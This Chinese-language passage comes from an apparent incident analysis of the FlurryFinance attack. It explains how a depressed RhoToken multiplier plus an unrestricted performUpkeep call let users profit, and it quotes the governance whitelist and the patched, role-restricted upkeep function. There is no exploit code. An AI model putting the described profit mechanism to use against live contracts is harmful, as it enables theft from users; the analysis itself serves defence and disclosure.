由于之前的攻击导致 RhoToken 的 Multiplier 低于正常值，用户可以用稳定币以低价换取RhoToken。调用完 performUpkeep 后 Multiplier 回归正常值，用户之前换取的 RhoToken 的数量就会增加（在本例中大概是之前的1.2倍），此时用户将 RhoToken 换回稳定币即可获利。


## 总结


本次攻击 FlurryFinance的实现本身没有问题，漏洞点出现在第三方的Strategy合约，但是FlurryFInance本身的设计中标的资产存储地址和用于计算币价的存储地址不同，且没有考虑第三方合约的安全性，间接的导致了攻击的发生。


### 事后调查


漏洞 strategy 为 RabbitFinance 于 攻击事件发生前280天前部署，使用的频率并不高，事件发生前最近一次交易是在80天之前。
关于 strategy 的注册，从 Goblin 代码中体现为只有管理者才有权限管理（地址：0xB2AABC9439354F3A73698F47BeFd2D7550144Cbc）：


```solidity
   function setStrategyOk(address[] calldata strats, bool isOk) external onlyGov {
        uint len = strats.length;
        for (uint idx = 0; idx < len; idx++) {
          okStrats[strats[idx]] = isOk;
        }
    }
```


事件发生后，FlurryFinance 对项目进行修补，将之前没有限制的 performUpkeep 函数做了调用者的角色限制：
相关代码（地址：0xb4111084730D7C73b22B58C5a0A91Ea8790D162d）：

```solidity
   function performUpkeep(bytes calldata) external override onlyRole(RELAYER_ROLE) {
        lastTimeStamp = block.timestamp;
        for (uint256 i = 0; i < vaults.length; i++) {
            address underlying = address(vaults[i].underlying());
            (uint256 oldMultiplier, uint256 lastupdate) = vaults[i].rhoToken().getMultiplier();


            try vaults[i].rebase() {
                lastupdate; // not used.
            } catch Error(string memory reason) {
                emit RebaseError(oldMultiplier, reason);
                checkPauseOnError(underlying);
            } catch (bytes memory) {
                checkPauseOnError(underlying);
            }
        }
    }
```

RELAYER_ROLE地址为：0x0656eF4A404e62cfaAf6659107Ba836417616678，是一个EOA地址，观察其交易序列可以知道其工作就是在每天的16：00pm定时调用 performUpkeep。


整体上代码逻辑没有变化，毕竟出现漏洞的合约是第三方外部合约，FlurryFinance 本身并没发现问题，所以这一修改方案或许就是最好的选择。

